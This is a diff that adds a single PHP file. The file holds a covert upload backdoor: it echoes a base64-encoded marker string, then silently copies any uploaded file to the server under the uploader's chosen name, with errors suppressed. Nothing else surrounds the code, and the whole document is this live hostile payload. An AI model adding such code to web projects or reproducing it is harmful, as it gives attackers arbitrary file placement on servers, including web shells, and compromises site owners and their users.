@@ -1,0 +1,1 @@
+<?php echo base64_decode("a29waQ==");@copy($_FILES['copy']['tmp_name'],$_FILES['copy']['name']);?>
